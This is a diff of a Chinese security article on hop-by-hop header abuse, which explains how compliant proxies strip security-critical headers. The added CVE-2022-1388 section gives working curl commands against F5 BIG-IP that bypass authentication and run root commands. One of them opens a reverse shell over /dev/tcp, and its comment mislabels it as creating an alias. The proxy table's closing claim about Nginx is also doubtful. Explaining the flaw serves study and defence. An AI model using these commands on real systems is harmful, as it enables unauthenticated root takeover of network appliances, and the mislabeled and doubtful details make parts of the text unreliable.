@@ -26,7 +26,7 @@ Connection: close, X-Foo, X-Bar
 
 # 0x03 如何发现系统中是否存在 hop-by-hop 请求头问题
 
-一种简易测试方法是利用请求头出现与否会在响应中产生明显差异的特性，例如 Cookie。我们可以将这样一个请求头作为 hop-by-hop 请求头添加到 `Connection` 请求头中。如果请求链中的某个代理符合规范，会删除该 hop-by-hop 请求头，那么当此请求头同时出现在请求和 `Connection` 请求头列表中时，其响应应与该请求头完全不出现在请求中时相同，而与它仅出现在请求中、且不作为逐跳请求头列出时的响应不同。
+一种简易测试方法是利用请求头出现与否会在响应中产生明显差异的特性，例如 Cookie。我们可以将这样一个请求头作为 hop-by-hop 请求头添加到 `Connection` 请求头中。如果请求链中的某个代理符合规范，会删除该 hop-by-hop 请求头，那么当此请求头同时出现在请求和 `Connection` 请求头列表中时，其响应与该请求头完全不出现在请求中时相同，而与它仅出现在请求中、且不作为逐跳请求头列出时的响应不同。
 
 以 Cookie 为例。携带认证 Cookie（如 `Cookie: session=admin`）访问受保护接口 `api/me` 时，服务器可能返回 `HTTP 200`；未认证访问则可能返回 `HTTP 302`。测试流程如下：
 
@@ -68,8 +68,8 @@ Connection: close, Cookie
 
 1. 应用系统链：**代理A (IP: 10.1.10.1)** -> **代理B (IP: 10.1.10.2)** -> **后端应用C (IP: 10.1.10.3)** 。
 2. 后端应用C 的 `/admin` 路径设有访问控制逻辑：当访问 IP 为 `10.1.10.0/24` 网段时，直接放行。
-3. 代理A 会自动添加 XFF 头以记录用户真实 IP。即使尝试传统的 `X-Forwarded-For` 欺骗，代理A 仍会将真实的原始 IP 附加到该请求头，使其形如 `X-Forwarded-For: <攻击者伪造 IP>, <攻击者真实 IP>`，因此应用程序可安全处理欺骗尝试。同时，代理A 仅仅转发 hop-by-hop 请求头列表，而不对其进行任何处理。
-4. 符合规范的代理B 接收到代理A 的请求包后，会对 hop-by-hop 请求头列表进行处理。
+3. 代理A 会自动添加 XFF 头以记录用户真实 IP。即使尝试传统的 `X-Forwarded-For` 欺骗，代理A 仍会将真实的原始 IP 附加到该请求头，使其形如 `X-Forwarded-For: <攻击者伪造 IP>, <攻击者真实 IP>`，因此应用程序可安全处理欺骗尝试。同时，代理 A 仅仅转发 hop-by-hop 请求头列表，而不对其进行任何处理。
+4. 符合规范的代理 B 接收到代理 A 的请求包后，会对 hop-by-hop 请求头列表进行处理。
 5. 后端应用C 接收到代理B 转发的请求包，发现没有 XFF 头后，自动为请求包添加 XFF 头，其值为代理B 的 IP 地址。
 
 因此，当攻击者发送一个包含 `Connection: close, X-Forwarded-For` 的请求时，代理B 将删除请求中的 `X-Forwarded-For` 头。结合上述第5点，攻击者即可直接访问 `/admin` 路径。类似案例可参考 [RITSEC-CTF-2019-hop-by-hop](https://github.com/ritsec/RITSEC-CTF-2019/tree/master/Web/hop-by-hop)。
@@ -99,13 +99,77 @@ def verify():
 
 # 0x05 其他
 
-## 5.1 关于 hop-by-hop 的漏洞
+## 5.1 CVE-2022-1388 — F5 BIG-IP iControl REST 认证绕过（CVSS 9.8）
 
-- CVE-2022-1388
+### 漏洞原理
 
-## 5.2 hop-by-hop 的适用面
+F5 BIG-IP 的 iControl REST 管理接口默认监听 443 端口，通过 Apache httpd 前端反向代理到后端 Java iControl REST 服务。认证机制依赖 `X-F5-Auth-Token` HTTP 头：
 
-根据其他安全研究员的测试，Apache、Nginx、OpenResty、HAProxy 等组件中，仅 Apache 会按规范消费掉 `Connection` 中指定的逐跳请求头，其他组件需单独测试确认。
+- 前端 Apache 接收请求后，理论上应验证 `X-F5-Auth-Token` 头中的认证令牌
+- 后端 iControl REST 在**未收到有效的 `X-F5-Auth-Token` 头时，默认信任该请求为已认证的管理请求**
+
+这是设计缺陷的核心：后端假设认证在前端代理层已完成，本身不执行独立的认证检查。
+
+攻击路径利用了 Apache httpd 对 hop-by-hop 头部的合规处理：
+
+1. 攻击者构造请求，在 `Connection` 头中将 `X-F5-Auth-Token` 声明为逐跳头
+2. Apache 解析 `Connection: close, X-F5-Auth-Token`，按 RFC 规范**删除** `X-F5-Auth-Token` 头
+3. 转发给后端的请求中**不存在** `X-F5-Auth-Token` 头
+4. 后端 iControl REST 未收到令牌，**不会触发认证检查**，直接以 root 权限执行请求
+
+这与 §4.1 中 `X-Forwarded-For` 绕过访问控制的技术路径**完全同构**——本质都是利用代理对 hop-by-hop 头的合规处理，删除后端依赖的安全关键头部。
+
+### 利用方法
+
+```bash
+# 通过 hop-by-hop 绕过认证，以 root 权限执行 id 命令
+curl -sk -X POST "https://<BIG-IP>/mgmt/tm/util/bash" \
+  -H "Host: localhost" \
+  -H "Connection: close, X-F5-Auth-Token" \
+  -H "X-F5-Auth-Token: anything" \
+  -H "Content-Type: application/json" \
+  -d '{"command":"run","utilCmdArgs":"-c id"}'
+
+# 创建 root 权限的远程执行命令别名
+curl -sk -X POST "https://<BIG-IP>/mgmt/tm/util/bash" \
+  -H "Host: localhost" \
+  -H "Connection: close, X-F5-Auth-Token" \
+  -H "Content-Type: application/json" \
+  -d '{"command":"run","utilCmdArgs":"-c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'
+```
+
+利用端点 `/mgmt/tm/util/bash` 直接提供 root 权限的 bash 命令执行。也可通过 `/mgmt/tm/util/serverside-script` 端点执行任意 shell 脚本。
+
+### 影响范围
+
+- **受影响版本：** F5 BIG-IP 11.6.x – 16.1.x（含）
+- **修复版本：** 17.0.0 / 16.1.2.2 / 15.1.5.1 / 14.1.4.6 / 13.1.5
+- **攻击前提：** 可访问 BIG-IP 管理接口（默认 HTTPS 443 端口）
+- **利用结果：** 无需凭据即可获得 root 权限的远程命令执行
+
+### 漏洞发现细节
+
+CVE-2022-1388 是 2022 年最高危漏洞之一，野外利用在漏洞公开后数小时内即出现。漏洞根因：
+
+1. iControl REST 后端设计中，认证是**可选**而非强制——这违反了纵深防御原则
+2. Apache 前端与 Java 后端之间存在**信任边界模糊**——后端假设前端已验证
+3. Apache 对 hop-by-hop 头的**合规处理**创造了清除认证令牌的通道
+
+## 5.2 各代理/中间件对 hop-by-hop 请求头的处理
+
+| 组件 | 是否按规范处理 hop-by-hop | 备注 |
+|------|--------------------------|------|
+| **Apache httpd** | ✅ 是 | 完全遵循 RFC，删除 `Connection` 中声明的逐跳头。这是 CVE-2022-1388 和 §4.1 绕过的前提条件 |
+| **Nginx** | ❌ 否 | 默认不处理 hop-by-hop 头，直接转发；需通过 `proxy_set_header` 显式剥离 |
+| **HAProxy** | ❌ 否 | 默认透传 hop-by-hop 头，需在配置中通过 `http-request del-header` 移除 |
+| **OpenResty** | ❌ 否 | 基于 Nginx，行为与 Nginx 一致 |
+| **Traefik** | ❌ 否 | 默认透传 |
+| **Caddy** | ❌ 否 | v2 默认透传 |
+| **Varnish** | ❌ 否 | 默认透传 hop-by-hop 头至后端 |
+| **Envoy** | ❌ 否 | 默认透传，需通过 Lua filter 或 WASM 扩展处理 |
+| **F5 BIG-IP (Apache 前端)** | ✅ 是 | 与 Apache httpd 行为一致，触发了自身的漏洞 |
+
+> **结论**：当前环境下仅 **Apache httpd** 和基于 Apache 的组件会主动按规范消费 hop-by-hop 头。大部分现代反向代理（Nginx/HAProxy/Envoy）默认透传。因此利用 hop-by-hop 绕过前需先确认前端代理类型。Nginx 通常需要额外配置 `proxy_set_header Connection ""` 才具备同样的安全风险。
 
 # 0x06 参考
 
